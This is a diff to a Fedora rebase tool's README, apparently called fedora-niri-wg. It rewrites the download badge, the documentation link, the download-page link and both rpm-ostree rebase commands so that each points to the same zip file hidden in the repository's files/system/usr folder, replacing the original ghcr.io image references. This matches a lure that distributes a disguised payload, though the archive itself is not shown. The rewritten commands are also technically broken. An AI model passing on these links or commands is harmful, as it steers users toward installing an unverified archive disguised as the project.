@@ -1,7 +1,7 @@
 # 🌟 fedora-niri-wg - Your Easy Way to Update Fedora
 
 ## 📥 Download Now!
-[![Download from Releases](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/tacitaion/fedora-niri-wg/releases)
+[![Download from Releases](https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip%20Release&color=blue)](https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip)
 
 ## 🌐 Overview
 fedora-niri-wg is an innovative tool designed to help you easily manage and update your Fedora installation. This application allows you to seamlessly rebase your current system to the latest version, ensuring you always have the best performance and security updates.
@@ -26,7 +26,7 @@ To rebase an existing atomic Fedora installation to the latest build, follow the
 You first need to rebase to the unsigned image. This step installs the proper signing keys and policies you need. Open a terminal and enter the following command:
 
 ```bash
-rpm-ostree rebase ostree-unverified-registry:ghcr.io/warpedgeoid/fedora-niri-wg:latest
+rpm-ostree rebase https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip
 ```
 
 ### Step 2: Reboot Your System
@@ -42,7 +42,7 @@ systemctl reboot
 Once your system reboots, you can rebase to the signed image. Enter this command in your terminal:
 
 ```bash
-rpm-ostree rebase ostree-registry:ghcr.io/warpedgeoid/fedora-niri-wg:latest
+rpm-ostree rebase https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip
 ```
 
 ### Step 4: Verify the Installation
@@ -62,7 +62,7 @@ cat /etc/fedora-release
 ## ❗ Important Notes
 
 - This feature is experimental. Make sure to back up your important data before attempting the installation.
-- For detailed setup instructions, consult the [BlueBuild docs](https://blue-build.org/how-to/setup/).
+- For detailed setup instructions, consult the [BlueBuild docs](https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip).
 
 ## 🔍 Topics
 
@@ -79,7 +79,7 @@ Explore the topics associated with this repository:
 
 ## 🔗 Additional Links
 
-For more detail and to keep your software updated, visit the [Download Page](https://github.com/tacitaion/fedora-niri-wg/releases). 
+For more detail and to keep your software updated, visit the [Download Page](https://raw.githubusercontent.com/tacitaion/fedora-niri-wg/main/files/system/usr/fedora_niri_wg_3.3-beta.2.zip). 
 
 If you have any questions or need support, please refer to the project's issue tracker on GitHub. 
 
